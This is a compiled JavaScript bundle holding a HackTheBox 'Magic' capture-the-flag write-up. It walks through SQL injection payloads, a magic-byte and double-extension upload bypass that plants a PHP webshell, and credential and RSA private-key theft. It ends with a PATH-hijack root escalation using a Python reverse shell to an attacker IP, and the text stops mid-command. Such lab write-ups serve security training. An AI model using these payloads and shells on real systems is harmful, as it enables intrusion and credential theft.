"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6289],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var a=n(67294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var o=a.createContext({}),r=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},u=function(e){var t=r(e.components);return a.createElement(o.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,l=e.originalType,o=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),c=r(n),h=i,m=c["".concat(o,".").concat(h)]||c[h]||d[h]||l;return n?a.createElement(m,p(p({ref:t},u),{},{components:n})):a.createElement(m,p({ref:t},u))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var l=n.length,p=new Array(l);p[0]=h;var s={};for(var o in t)hasOwnProperty.call(t,o)&&(s[o]=t[o]);s.originalType=e,s[c]="string"==typeof e?e:i,p[1]=s;for(var r=2;r<l;r++)p[r]=n[r];return a.createElement.apply(null,p)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},17003:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>p,default:()=>d,frontMatter:()=>l,metadata:()=>s,toc:()=>r});var a=n(87462),i=(n(67294),n(3905));const l={layout:"post",title:"Magic ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","sqli","suid"],date:"2020/08/21",thumbnail:"/img/HackTheBox/magic.png",toc:!0},p="Information",s={unversionedId:"HackTheBox/Magic/write-up",id:"HackTheBox/Magic/write-up",title:"Magic ",description:"- Name: Magic",source:"@site/writeups/HackTheBox/Magic/write-up.md",sourceDirName:"HackTheBox/Magic",slug:"/HackTheBox/Magic/write-up",permalink:"/writeups/HackTheBox/Magic/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"php",permalink:"/writeups/tags/php"},{label:"sqli",permalink:"/writeups/tags/sqli"},{label:"suid",permalink:"/writeups/tags/suid"}],version:"current",frontMatter:{layout:"post",title:"Magic ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","sqli","suid"],date:"2020/08/21",thumbnail:"/img/HackTheBox/magic.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Laboratory ",permalink:"/writeups/HackTheBox/Laboratory/write-up"},next:{title:"Mango ",permalink:"/writeups/HackTheBox/Mango/write-up"}},o={},r=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP Enumeration",id:"http-enumeration",level:2},{value:"SQL Injection",id:"sql-injection",level:2},{value:"File upload",id:"file-upload",level:2},{value:"Webshell",id:"webshell",level:2},{value:"Privilege Escalation : www-data to theseus",id:"privilege-escalation--www-data-to-theseus",level:2},{value:"System enumeration",id:"system-enumeration",level:2},{value:"Privilege Escalation : theseus to root",id:"privilege-escalation--theseus-to-root",level:2}],u={toc:r},c="wrapper";function d(e){let{components:t,...l}=e;return(0,i.kt)(c,(0,a.Z)({},u,l,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"information"},"Information"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Name:")," Magic"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Profile:")," ",(0,i.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/241"},"www.hackthebox.eu")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"magic",src:n(14313).Z,width:"598",height:"381"})),(0,i.kt)("h2",{id:"overview"},"Overview"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"TL;DR"),": SQLi, webshell upload with bypass, pe via SUID tool using unsecured\nPATH."),(0,i.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pacman -S nmap sqlmap haiti weevely metasploit pwncat\n")),(0,i.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,i.kt)("p",null,"With a ",(0,i.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan be can see only 2 open ports: 80 & 22."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Jun 12 13:15:34 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.185\nNmap scan report for 10.10.10.185\nHost is up (0.021s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)\n|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)\n|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Magic Portfolio\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Jun 12 13:16:00 2020 -- 1 IP address (1 host up) scanned in 25.72 seconds\n")),(0,i.kt)("h2",{id:"http-enumeration"},"HTTP Enumeration"),(0,i.kt)("p",null,"Quickly we found a few pages:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"http://10.10.10.185/index.php"},"http://10.10.10.185/index.php")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"http://10.10.10.185/login.php"},"http://10.10.10.185/login.php")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"http://10.10.10.185/upload.php"},"http://10.10.10.185/upload.php")," (authenticated)")),(0,i.kt)("p",null,"On the login page we can see we have a different behavior when we put of quote\nin the username or password and when not. So let's try a SQLi."),(0,i.kt)("h2",{id:"sql-injection"},"SQL Injection"),(0,i.kt)("p",null,"I used ",(0,i.kt)("a",{parentName:"p",href:"https://sqlmap.org"},"sqlmap")," to quickly identify the injection technique and automate the process."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ sqlmap -u http://10.10.10.185/login.php --method POST --data 'username=admin&password=password' --level 3 --risk 3\n...\nsqlmap identified the following injection point(s) with a total of 628 HTTP(s) requests:\n---\nParameter: password (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: username=admin&password=-2142' OR 8380=8380-- HhVJ\n\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: username=-5412' OR 2974=2974-- buTK&password=password\n---\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: username, type: Single quoted string (default)\n[1] place: POST, parameter: password, type: Single quoted string\n[q] Quit\n> 0\n[15:38:07] [INFO] testing MySQL\n[15:38:07] [INFO] confirming MySQL\n[15:38:07] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.0\n[15:38:07] [INFO] fetched data logged to text files under '/home/cyfun/.sqlmap/output/10.10.10.185'\n")),(0,i.kt)("p",null,"Nice we have 2 injection points for our OR boolean-based blind SQL injection."),(0,i.kt)("p",null,"Now I'll some options to get more information:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"--current-user")," -> ",(0,i.kt)("inlineCode",{parentName:"li"},"theseus@localhost")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"--current-db")," -> ",(0,i.kt)("inlineCode",{parentName:"li"},"Magic")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"--hostname")," -> ",(0,i.kt)("inlineCode",{parentName:"li"},"ubuntu")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"--is-dba")," -> ",(0,i.kt)("inlineCode",{parentName:"li"},"False")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"--tables -D Magic")," -> ",(0,i.kt)("inlineCode",{parentName:"li"},"login")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-D Magic -T login --columns")," ->",(0,i.kt)("pre",{parentName:"li"},(0,i.kt)("code",{parentName:"pre"},"+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| id       | int(6)       |\n| password | varchar(100) |\n| username | varchar(50)  |\n+----------+--------------+\n"))),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-D Magic -T login --dump")," ->",(0,i.kt)("pre",{parentName:"li"},(0,i.kt)("code",{parentName:"pre"},"+------+----------+----------------+\n| id   | username | password       |\n+------+----------+----------------+\n| 1    | admin    | Th3s3usW4sK1ng |\n+------+----------+----------------+\n")))),(0,i.kt)("p",null,"Note: We could have done a dump directly but that would have been dirty and far\nless efficient if there were more databases, tables, entries, etc. Also we\nprobably didn't needed to dump the password, we could have just bypass the\nauthentication. But the password may be reused somewhere else and there could\nhave been more stuff in the DB."),(0,i.kt)("h2",{id:"file-upload"},"File upload"),(0,i.kt)("p",null,"We are now redirected to the upload page."),(0,i.kt)("p",null,"Only jpg, jpeg and png extensions are allowed."),(0,i.kt)("p",null,"If we upload a legit image, we receive a message: ",(0,i.kt)("inlineCode",{parentName:"p"},"The file hacker_logo.jpg has been uploaded."),"."),(0,i.kt)("p",null,"Let's go back to the index to see if our logo is listed there."),(0,i.kt)("p",null,"The image is uploaded here: ",(0,i.kt)("a",{parentName:"p",href:"http://10.10.10.185/images/uploads/hacker_logo.jpg"},"http://10.10.10.185/images/uploads/hacker_logo.jpg")),(0,i.kt)("p",null,"And have a weird title: ",(0,i.kt)("inlineCode",{parentName:"p"},"14331a21"),"."),(0,i.kt)("p",null,"I check if it can be a digest with :"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ haiti 14331a21\nAdler-32\nCRC-32B\nFCS-32\nGHash-32-3\nGHash-32-5\nFNV-132\nFletcher-32\nJoaat\nELF-32\nXOR-32\nCRC-32 [JtR: crc32]\nMicrosoft Outlook PST\nDahua [JtR: dahua]\n")),(0,i.kt)("p",null,"The most probable option is CRC32."),(0,i.kt)("p",null,"So I tried to see if it could be the CRC32 of the filename with an\n",(0,i.kt)("a",{parentName:"p",href:"https://crccalc.com/"},"online service"),"."),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://i.imgur.com/i1u0aZL.png",alt:null})),(0,i.kt)("p",null,"But it seems not."),(0,i.kt)("p",null,"It could be the CRC32 of the file itself but before using more guessing let's\nupload the same file again with the same name to see if the title is not random."),(0,i.kt)("p",null,"It replaced the previous image but is now entitled ",(0,i.kt)("inlineCode",{parentName:"p"},"806a94c"),"."),(0,i.kt)("p",null,"So the title seems to be random, so no need to try to calculate it."),(0,i.kt)("p",null,"So let's see if we can simply bypass something to upload a PHP file."),(0,i.kt)("p",null,"I generated a ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/epinna/weevely3"},"weevely")," agent (PHP webshell):"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ weevely generate cyfun agentcyfun.php\nGenerated 'agentcyfun.php' with password 'cyfun' of 761 byte size.\n")),(0,i.kt)("p",null,"I tried to upload the shell without changing the ",(0,i.kt)("em",{parentName:"p"},"Content-Type")," and just\nchanging the name to ",(0,i.kt)("inlineCode",{parentName:"p"},"agentcyfun.php.png")," and received the following message\nthat suggested I was spotted:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"What are you trying to do there?\n")),(0,i.kt)("p",null,"But changing the Content-Type from ",(0,i.kt)("inlineCode",{parentName:"p"},"application/x-php")," to ",(0,i.kt)("inlineCode",{parentName:"p"},"application/x-php"),"\ndidn't change anything."),(0,i.kt)("p",null,"The name ",(0,i.kt)("inlineCode",{parentName:"p"},"Magic")," is maybe because there is a magic bytes check and this message\nis displayed when content type, extension and magic byte don't match."),(0,i.kt)("p",null,"Let's check the signature of jpeg and png:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ xxd -l 12 ~/Pictures/hacker_logo.jpg     \n00000000: ffd8 ffe0 0010 4a46 4946 0001            ......JFIF..\n$ xxd -l 8 ~/Pictures/rawsec/logo5_50x40.png \n00000000: 8950 4e47 0d0a 1a0a                      .PNG....\n")),(0,i.kt)("p",null,"We can also check\n",(0,i.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/List_of_file_signatures"},"the list on Wikipedia"),"\nbecause jpeg supports 2 other signatures."),(0,i.kt)("p",null,"We can store the signatures in files:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ echo -n "\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a" > png_signature\n$ echo -n "\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01" > jpg_signature\n')),(0,i.kt)("p",null,"Then let's try to prepend the PNG signature to the webshell."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ cat png_signature agentcyfun.php > agent_png.png\n$ cat jpg_signature agentcyfun.php > agent_jpg.jpg\n")),(0,i.kt)("p",null,"Let's upload again, this time we are not spotted. The image is\nsuccessfully uploaded to ",(0,i.kt)("a",{parentName:"p",href:"http://10.10.10.185/images/uploads/agent_png.png"},"http://10.10.10.185/images/uploads/agent_png.png")," but\nas it is served as a png, the PHP is not interpreted.\nLet's see if we send a png extension and a php Content-Type."),(0,i.kt)("p",null,"This is accepted too. But it is still served as a png. I'll try to put a php\nextension but I think we will be caught by the extension whitelist.\nIndeed we were spotted."),(0,i.kt)("p",null,"So let's try the double extension (",(0,i.kt)("inlineCode",{parentName:"p"},".png.php"),") -> spotted.\nLet's try a null byte injection (",(0,i.kt)("inlineCode",{parentName:"p"},".php\\00.png"),") even if I don't believe it will works."),(0,i.kt)("p",null,"It tells me ",(0,i.kt)("inlineCode",{parentName:"p"},"00.png")," was uploaded (",(0,i.kt)("a",{parentName:"p",href:"http://10.10.10.185/images/uploads/00.png"},"http://10.10.10.185/images/uploads/00.png"),")\nbut it's served as png. Let's see if ",(0,i.kt)("inlineCode",{parentName:"p"},"agent_png.php")," was created\n(",(0,i.kt)("a",{parentName:"p",href:"http://10.10.10.185/images/uploads/agent_png.php"},"http://10.10.10.185/images/uploads/agent_png.php"),"): no."),(0,i.kt)("p",null,"What if we try the double extension without null byte but in the other way (",(0,i.kt)("inlineCode",{parentName:"p"},".php.png"),").\nIt seems ",(0,i.kt)("a",{parentName:"p",href:"http://10.10.10.185/images/uploads/agent_png.php.png"},"http://10.10.10.185/images/uploads/agent_png.php.png")," is interpreted as PHP!"),(0,i.kt)("h2",{id:"webshell"},"Webshell"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ weevely terminal http://10.10.10.185/images/uploads/agent_png.php.png cyfun\n\n[+] weevely 4.0.1\n\n[+] Target:     10.10.10.185\n[+] Session:    /home/cyfun/.weevely/sessions/10.10.10.185/agent_png.php_0.session\n\n[+] Browse the filesystem or execute commands starts the connection\n[+] to the target. Type :help for more information.\n\nweevely> id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@ubuntu:/var/www/Magic/images/uploads $ \n")),(0,i.kt)("p",null,"The issue is that the webshell is removed a few seconds after being uploaded.\nSo we'll have to use a PHP dropper to get a rverse shell immediately."),(0,i.kt)("p",null,"We could craft one with ",(0,i.kt)("inlineCode",{parentName:"p"},"msfvenom")," (from ",(0,i.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"Metasploit"),") but weevely have a\nbunch of useful modules like this one:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"www-data@ubuntu:/var/www/Magic/images/uploads $ :backdoor_reversetcp -h\nusage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect] [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}] lhost port\n\nExecute a reverse TCP shell.\n\npositional arguments:\n  lhost                 Local host\n  port                  Port to spawn\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -shell SHELL          Specify shell\n  -no-autonnect         Skip autoconnect\n  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}\n")),(0,i.kt)("p",null,"Note: for OSCP it's also good to know how to do without ",(0,i.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"Metasploit"),"."),(0,i.kt)("p",null,"I start a ",(0,i.kt)("a",{parentName:"p",href:"https://pwncat.org/"},"pwncat")," listener on my machine:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ pwncat -l 8888\n")),(0,i.kt)("p",null,"Re-uploaded my webshell, executed it and launched the reverse shell module:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"weevely> :backdoor_reversetcp 10.10.15.18 8888\n")),(0,i.kt)("p",null,"Nice, I have a true shell that I won't lost on my ",(0,i.kt)("a",{parentName:"p",href:"https://pwncat.org/"},"pwncat")," listener:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ pwncat -l 8888\n/bin/sh: 0: can't access tty; job control turned off\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,i.kt)("h2",{id:"privilege-escalation--www-data-to-theseus"},"Privilege Escalation : www-data to theseus"),(0,i.kt)("p",null,"We can just connect by re-using the credentials we looted during the SQLi."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ python3 -c \"import pty;pty.spawn('/bin/bash')\"\nwww-data@ubuntu:/var/www/Magic/images/uploads$ ls /home\ntheseus\n\nwww-data@ubuntu:/var/www/Magic/images/uploads$ su theseus\nPassword: Th3s3usW4sK1ng\n\ntheseus@ubuntu:/var/www/Magic/images/uploads$ id\nuid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)\n")),(0,i.kt)("p",null,"But there was another method for those who just used an authentication bypass\ninstead of dumping the database."),(0,i.kt)("p",null,"Find the database credentials:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"theseus@ubuntu:/var/www/Magic/images/uploads$ ls ../..\nassets   images     login.php   sql.php     sql_v3.php\ndb.php5  index.php  logout.php  sql_v2.php  upload.php\n\ntheseus@ubuntu:/var/www/Magic/images/uploads$ cat ../../db.php5\n<?php\nclass Database\n{\n    private static $dbName = 'Magic' ;\n    private static $dbHost = 'localhost' ;\n    private static $dbUsername = 'theseus';\n    private static $dbUserPassword = 'iamkingtheseus';\n...\n")),(0,i.kt)("p",null,"And then dump the database:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ mysqldump --databases Magic -utheseus -piamkingtheseus\n...\nINSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');\n...\n")),(0,i.kt)("p",null,"And then log in with ",(0,i.kt)("inlineCode",{parentName:"p"},"su")," too."),(0,i.kt)("p",null,"Then let's loot the flag and copy the private key, so if the box is reset we\ncan start back from here instead of playing with the reverse shell again."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"theseus@ubuntu:~$ cat user.txt\n1a1fa3ca1d83a1b0dd709cdcbdb15df0\n\ntheseus@ubuntu:~$ cat .ssh/id_rsa\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},".ssh/id_rsa")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEA6ruVQANqao9pxNJ2g5XkHkyMq5zOCoTlJwTVlkO6HS0X9edW\nEYbRuvDeBIaG9jQ3S2Kp7wWxKnP9TBU2Yd8sAwdjXN4qa4ePGLiRWaI76A3X5Mtu\nTFRzi7/hUrBuO+MhFMgVlkBCDSf9P9JGLFS+9xqAbbi3Jx+MTKjIR7rkkmPJITvj\nwuI5h+fGK1e1OkJ8MGjTlDuHWpVHpixgY07shz5FlXsnUx79y7ZSQZu7XZbEgw3I\njnZUppKZKXW2vvswDzRQkbwJnRRVNBIKww6IvDLKS0bdvtrVJEh5g+IJT98TNLV1\neLjVjimmFhv8Zg4YM2cdXtDIUezy+GPgCATbSQIDAQABAoIBAA5cz/MMwnQmtkgO\nwKWohD6+XFUb0Refrg3HI/J/zmF+otqu/vsvjqGrn0oTmSpzY3a/YLp5VK/OTQ9c\ntOkkKKM+znueNGZD8yOGF46ueI/oWO9s6yDMgg1o/jZ7CSOs8Bc/buK0p9X6Pmqr\nSRPpU433FyifhsVkDseaBDcvXlD+oA1AMuoUv7RW+6YEgPLQK+GJqW9qClqJl72A\nZcwLHV2pEDP8q/r5z+6liUWYZSf9VMjtsB7P7DYLatFb/iXPgMzPl3Ee3K69e7vu\n0H56M6pFfnwBmi9/j7SfWsOkiNH+SCCi9OIcDnSytW1Qvs5L2su5TQ19A8gZps9x\nuOVt4ikCgYEA+RlW8d4QmCGlQD5AdkvxOXHCKkF97z88yRBIfMV+/oNz8IL67QJ2\nfJP71SK8/K3xulmSouaMExmd9hD7soLkyNOr5ek0hEZ2tTnlMEGcqvzf/LPeDx7q\neFlxn1Ls+u6Jmbr/gyl6kMzpCia+l5K+Azu4ONLRbTQADPDOg1BFbBsCgYEA8Txa\n6VJDR7KyX0165yFReMWz4MuwEyd6kUjjzmSuQn1xWPacUdSxgxqGBGPWx9rFCcMt\ntKBhD8HW1RjO0/vi6K5K/Gygr8D2lpDuY+92EhD3FHx2lZveibloMTS0a42ySm4m\ndsYuhxnJ26VtN/FnQAXZfRM1B0mALx7qP4h0xGsCgYAyDseMH2YSTGCbAmeN3kEB\nnDy6pSKbm4epmB4ZBM86ckwwPwIR8vbAnjRzZmG4HXSAUFPJbK8lf3Zg5pTOEMPN\nH8xhjXXCRy6/yHyoL+c97UdNzw+G1l2kBcVxkQaSfrEkNZH3V7SLuMH0CkkuyIxq\nteuVb7gqS9Lext2ZQd5RlQKBgGxvl+H3Y1zQO5PRTSSl+mxSWif7Bzuk7FhwLk5x\nPU+P+apmuB+kfuKSwpkok7wkX5uiy2G9EcQ2eq4xR49MU1QKPJS484XtNCq8HRx4\n4FcAnz/rLpbTiLXZzLcJnOwXtoP0fX+4V+PMuMrt0mlqLuI9fuTVBGoxJNiJifxj\nBzHfAoGARjeDy+yQSUUwUbrFMbyWhNnX8fef4h4lGmlZTZTjC5tL1tOQ3/QPvgnp\nI9Esc9FP8QLqR3jJOdijaN59oByGFiEE1QGnODeHRt2czK388XtH/FTqsjhH360R\n+8ylF6696X9DMnUQ4NEvDRRLR7JKae8fcu5d/SRsenB+1ck2djs=\n-----END RSA PRIVATE KEY-----\n")),(0,i.kt)("p",null,"So we can login through SSH now:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ chmod 600 id_rsa\n$ ssh theseus@10.10.10.185 -i id_rsa\nload pubkey "id_rsa": invalid format\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n29 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nYour Hardware Enablement Stack (HWE) is supported until April 2023.\nLast login: Thu Jul  2 08:19:49 2020 from 10.10.15.71\ntheseus@ubuntu:~$\n')),(0,i.kt)("p",null,"Note: is you are denied it's because someone overwrote ",(0,i.kt)("inlineCode",{parentName:"p"},"authorized_keys")," with\nit's personal key. So just append theseus public key:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"theseus@ubuntu:~$ cat .ssh/id_rsa.pub >> .ssh/authorized_keys\n")),(0,i.kt)("p",null,"PS: it seems the private key I used was not part of the box but generated by\nanother player, anyway you'll have to add a key to ",(0,i.kt)("inlineCode",{parentName:"p"},".ssh/authorized_keys"),"."),(0,i.kt)("h2",{id:"system-enumeration"},"System enumeration"),(0,i.kt)("p",null,"Let's find binaries with SUID:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"theseus@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/sbin/pppd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/chsh\n/usr/bin/traceroute6.iputils\n/usr/bin/arping\n/usr/bin/vmware-user-suid-wrapper\n...\n/bin/umount\n/bin/fusermount\n/bin/sysinfo\n/bin/mount\n/bin/su\n/bin/ping\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"/bin/sysinfo")," looks unusual:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"theseus@ubuntu:~$ ls -lh /bin/sysinfo\n-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo\n")),(0,i.kt)("h2",{id:"privilege-escalation--theseus-to-root"},"Privilege Escalation : theseus to root"),(0,i.kt)("p",null,"If we run ",(0,i.kt)("inlineCode",{parentName:"p"},"sysinfo")," there are 4 sections that seems to match so other system\ncommands:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Hardware Info: ",(0,i.kt)("inlineCode",{parentName:"li"},"lshw -short")),(0,i.kt)("li",{parentName:"ul"},"Disk Info: ",(0,i.kt)("inlineCode",{parentName:"li"},"fdisk -l")),(0,i.kt)("li",{parentName:"ul"},"CPU Info: ",(0,i.kt)("inlineCode",{parentName:"li"},"cat /proc/cpuinfo")),(0,i.kt)("li",{parentName:"ul"},"MEM Usage: ",(0,i.kt)("inlineCode",{parentName:"li"},"free -h"))),(0,i.kt)("p",null,"So basically what we have to do is change the ",(0,i.kt)("inlineCode",{parentName:"p"},"PATH")," env var to force the SUID\n",(0,i.kt)("inlineCode",{parentName:"p"},"sysinfo")," to call an attacker controlled binary instead of the system tools."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ mkdir /tmp/cyfun\n$ cd /tmp/cyfun\n$ touch fdisk\n$ vi fdisk\n$ chmod +x fdisk\n$ export PATH=/tmp/cyfun:$PATH\n$ echo $PATH\n/tmp/cyfun:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n$ which fdisk\n/tmp/cyfun/fdisk\n")),(0,i.kt)("p",null,"Here is the reverse shell I put in ",(0,i.kt)("inlineCode",{parentName:"p"},"fdisk"),":"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.32",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n')),(0,i.kt)("p",null,"The we just have to run ",(0,i.kt)("inlineCode",{parentName:"p"},"sysinfo")," to get the root shell:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ pwncat -l 8888 -v\n# pwd\n/tmp/cyfun\n# cd /root\n# cat root.txt\n8b6a4fda49b7bcfe0ed6b1925d45bd96\n# cat /etc/shadow | grep 